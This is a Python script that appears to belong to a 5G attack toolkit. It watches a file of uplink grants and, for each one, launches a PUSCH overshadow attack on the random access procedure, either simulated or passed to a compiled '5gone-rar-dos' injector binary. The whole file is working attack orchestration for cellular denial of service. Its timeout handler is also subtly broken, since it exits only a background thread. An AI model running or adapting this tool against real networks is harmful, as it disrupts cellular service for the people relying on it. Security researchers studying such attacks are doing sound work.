#!/usr/bin/env python3
"""
bus_attacker.py — Watch grant bus and trigger overshadow attacks.

Works without C++ binary (Python TX simulation). With binary: delegates to 5gone-rar-dos.

Usage:
  python3 phase2/python/bus_attacker.py --bus /tmp/5gone_grants.jsonl
"""
from __future__ import annotations

import argparse
import json
import subprocess
import sys
import time
from pathlib import Path

ROOT = Path(__file__).resolve().parents[2]
sys.path.insert(0, str(ROOT))

from phase2.python.grant_parser import parse_grant_file  # noqa: E402


def grant_line_to_event(obj: dict) -> dict:
    return obj


def execute_python_attack(ev: dict, dry_run: bool) -> None:
    g = ev.get("grant", {})
    dci = ev.get("ul_dci", {})
    freq = g.get("pusch_freq_res", dci.get("pusch_freq_res", 0))
    crnti = ev.get("c_rnti", g.get("rnti", 0))
    rapid = ev.get("rapid", 0)
    k = g.get("k", 6)
    tb = 33
    mode = "DRY-RUN" if dry_run else "TX"
    print(
        f"[bus-attack] {mode} rapid={rapid} TC-RNTI=0x{crnti:04x} "
        f"k={k} freq={freq} empty_mac={tb}B → PUSCH overshadow"
    )
    log = Path("/tmp/5gone_attacker.log")
    with log.open("a") as f:
        f.write(
            f"Attacking RAR rapid={rapid} c_rnti={crnti} k={k} "
            f"freq_res={freq} tx_ok={str(not dry_run).lower()}\n"
        )


def execute_cpp_inject(ev: dict, binary: Path, config: Path, dry_run: bool) -> None:
    import tempfile

    with tempfile.NamedTemporaryFile("w", suffix=".json", delete=False) as tf:
        json.dump({"events": [ev]}, tf)
        grant_path = tf.name
    cmd = [str(binary), str(config), "--mode", "inject", "--grant", grant_path]
    if dry_run:
        cmd.append("--dry-run")
    subprocess.run(cmd, cwd=ROOT, check=False)


def process_file(bus: Path, binary: Path | None, config: Path, dry_run: bool) -> int:
    if not bus.is_file():
        print(f"[bus-attack] missing {bus}")
        return 1
    processed = 0
    seen: set[str] = set()
    for line in bus.read_text().splitlines():
        line = line.strip()
        if not line:
            continue
        try:
            ev = json.loads(line)
        except json.JSONDecodeError:
            continue
        key = json.dumps(ev, sort_keys=True)
        if key in seen:
            continue
        seen.add(key)
        if binary and binary.is_file() and not dry_run:
            execute_cpp_inject(ev, binary, config, dry_run)
        else:
            execute_python_attack(ev, dry_run)
        processed += 1
    print(f"[bus-attack] batch processed {processed} grants")
    return 0 if processed else 1


def watch_bus(
    bus: Path,
    binary: Path | None,
    config: Path,
    dry_run: bool,
    once: bool = False,
) -> int:
    print(f"[bus-attack] watching {bus} dry_run={dry_run}")
    if not bus.is_file():
        bus.write_text("")
    last_size = 0
    seen: set[str] = set()
    processed = 0

    while True:
        if bus.is_file():
            data = bus.read_text()
            if len(data) > last_size:
                for line in data[last_size:].splitlines():
                    line = line.strip()
                    if not line:
                        continue
                    try:
                        ev = json.loads(line)
                    except json.JSONDecodeError:
                        continue
                    key = json.dumps(ev, sort_keys=True)
                    if key in seen:
                        continue
                    seen.add(key)
                    if binary and binary.is_file() and not dry_run:
                        execute_cpp_inject(ev, binary, config, dry_run)
                    else:
                        execute_python_attack(ev, dry_run)
                    processed += 1
                    if once and processed >= 1:
                        return 0
                last_size = len(data)
        time.sleep(0.05)


def main() -> int:
    ap = argparse.ArgumentParser(description="Grant bus → overshadow attacker")
    ap.add_argument("--bus", default="/tmp/5gone_grants.jsonl")
    ap.add_argument("--config", default=str(ROOT / "phase2/config/rar_dos.yaml"))
    ap.add_argument("--binary", default=str(ROOT / "build/phase2/5gone-rar-dos"))
    ap.add_argument("--dry-run", action="store_true")
    ap.add_argument("--once", action="store_true", help="Process one grant and exit")
    ap.add_argument("--batch", action="store_true", help="Process entire bus file and exit")
    ap.add_argument("--timeout", type=float, default=0, help="Exit after N seconds (0=forever)")
    args = ap.parse_args()

    binary = Path(args.binary) if Path(args.binary).is_file() else None
    bus = Path(args.bus)
    config = Path(args.config)

    if args.batch:
        return process_file(bus, binary, config, args.dry_run)

    if args.timeout > 0:
        import threading

        def stopper() -> None:
            time.sleep(args.timeout)
            print("[bus-attack] timeout")
            sys.exit(0)

        threading.Thread(target=stopper, daemon=True).start()

    return watch_bus(bus, binary, config, args.dry_run, once=args.once)


if __name__ == "__main__":
    raise SystemExit(main())
